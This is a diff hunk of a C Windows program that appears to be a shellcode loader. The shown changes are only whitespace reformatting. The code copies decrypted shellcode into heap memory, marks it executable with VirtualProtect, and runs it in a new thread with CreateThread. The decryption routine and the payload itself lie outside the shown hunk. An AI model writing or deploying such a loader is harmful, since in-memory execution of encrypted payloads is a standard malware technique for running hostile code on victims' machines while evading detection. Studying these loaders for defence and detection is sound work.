@@ -78,37 +78,37 @@ int main() {
     // Show the results
     printf("[+] Allocated address: 0x%p\n\n", pAllocatedAddress);
 
-	// Copy decrypted shellcode to allocated memory
-	memcpy(pAllocatedAddress, pPlaintext, dwPlainSize);
+   // Copy decrypted shellcode to allocated memory
+   memcpy(pAllocatedAddress, pPlaintext, dwPlainSize);
 
-	// Change memory protection
-	BOOL bProtect = VirtualProtect(pAllocatedAddress, dwPlainSize, PAGE_EXECUTE_READ, &oldProtect);
-	if (!bProtect) {
-		printf("[!] VirtualProtect failed with error: %d\n", GetLastError());
-		return 1;
-	}
+   // Change memory protection
+   BOOL bProtect = VirtualProtect(pAllocatedAddress, dwPlainSize, PAGE_EXECUTE_READ, &oldProtect);
+   if (!bProtect) {
+	printf("[!] VirtualProtect failed with error: %d\n", GetLastError());
+	return 1;
+   }
 
-    // Pause the program
-    printf("[~] Press any key to continue...\n");
-    getchar();
+   // Pause the program
+   printf("[~] Press any key to continue...\n");
+   getchar();
 
-    // Create a new thread to execute the shellcode
-    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pAllocatedAddress, NULL, 0, NULL);
-    if (hThread == NULL) {
-        printf("[!] CreateThread failed with error: %d\n", GetLastError());
-        return 1;
-    }
+   // Create a new thread to execute the shellcode
+   HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pAllocatedAddress, NULL, 0, NULL);
+   if (hThread == NULL) {
+     printf("[!] CreateThread failed with error: %d\n", GetLastError());
+     return 1;
+   }
 
-    // Print the thread handle
-    printf("[+] Thread created with handle: 0x%p\n\n", hThread);
+   // Print the thread handle
+   printf("[+] Thread created with handle: 0x%p\n\n", hThread);
+	
+   // Wait for the thread to complete
+   WaitForSingleObject(hThread, -1);
+   CloseHandle(hThread);
 
-    // Wait for the thread to complete
-    WaitForSingleObject(hThread, -1);
-    CloseHandle(hThread);
-
-    // Free memory
-    HeapFree(GetProcessHeap(), 0, pTmpBuffer);
-    HeapFree(GetProcessHeap(), 0, pPlaintext);
+  // Free memory
+  HeapFree(GetProcessHeap(), 0, pTmpBuffer);
+  HeapFree(GetProcessHeap(), 0, pPlaintext);
     
-    return 0;
+  return 0;
 }
